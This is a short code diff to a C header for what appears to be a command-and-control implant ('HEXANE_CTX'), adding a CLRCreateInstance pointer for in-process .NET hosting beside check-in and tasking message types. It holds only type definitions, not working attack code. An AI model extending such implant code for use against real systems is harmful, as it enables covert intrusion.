@@ -164,6 +164,8 @@ typedef NTSTATUS (WINAPI* TpAllocWork_t)(PTP_WORK* ptpWork, PTP_WORK_CALLBACK ca
 typedef VOID (WINAPI* TpPostWork_t)(PTP_WORK ptpWork);
 typedef VOID (WINAPI* TpReleaseWork_t)(PTP_WORK ptpWork);
 
+typedef HRESULT(WINAPI* CLRCreateInstance_t)(REFCLSID clsid, REFIID riid, LPVOID* ppInterface);
+
 enum MessageType {
 	TypeCheckin     = 0x7FFFFFFF,
 	TypeTasking     = 0x7FFFFFFE,
@@ -203,14 +205,22 @@ typedef struct {
 
 
 typedef struct {
+	PVOID  Buffer;
+	UINT32 Length;
+} BUFFER, *PBUFFER;
+
+
+typedef struct {
 	LPSTR 	Buffer;
 	ULONG 	Length;
 } A_BUFFER;
+
 
 typedef struct {
 	LPWSTR 	Buffer;
 	ULONG 	Length;
 } W_BUFFER;
+
 
 typedef struct {
     LPVOID  ResLock;
@@ -373,6 +383,10 @@ typedef struct {
 	} Nt;
 
 	struct {
+		CLRCreateInstance_t CLRCreateInstance;
+	} CLR;
+
+	struct {
 		PROTOTYPE(LoadLibraryA);
 		PROTOTYPE(FreeLibrary);
 		PROTOTYPE(GetProcessHeap);
@@ -459,7 +473,6 @@ typedef struct {
 		PROTOTYPE(InitializeAcl);
 		PROTOTYPE(FreeSid);
 
-		PROTOTYPE(CLRCreateInstance);
 	} win32;
 
 } HEXANE_CTX;
